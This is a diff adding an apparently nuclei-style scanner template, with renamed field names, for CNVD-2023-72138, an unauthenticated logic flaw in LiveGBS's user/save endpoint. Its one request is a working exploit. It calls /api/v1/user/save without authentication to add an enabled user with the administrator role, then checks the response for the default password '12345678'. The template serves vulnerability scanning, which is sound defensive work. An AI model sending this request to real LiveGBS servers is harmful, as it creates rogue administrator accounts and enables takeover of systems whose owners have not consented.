@@ -1,0 +1,31 @@
+id: CNVD-2023-72138
+brief:
+    title: LiveGBS user/save - Logical Flaw
+    by: pussycat0x
+    level: high
+    about: There is a logic defect vulnerability in LiveGBS user/save. Unauthenticated attackers can exploit this vulnerability to arbitrarily add users, resulting in the takeover of background services and c...
+    label:
+        - cnvd
+        - cnvd2023
+        - livegbs
+        - info-leak
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/api/v1/user/save?ID=&Username={{user}}&Role=管理员&Enable=true'
+      signs:
+        - "on": word
+          has:
+            - '"DefaultUserPassword": "12345678"'
+            - ID
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/json
+          in: content_type
+          need: all
+        - "on": status
+          status:
+            - 200
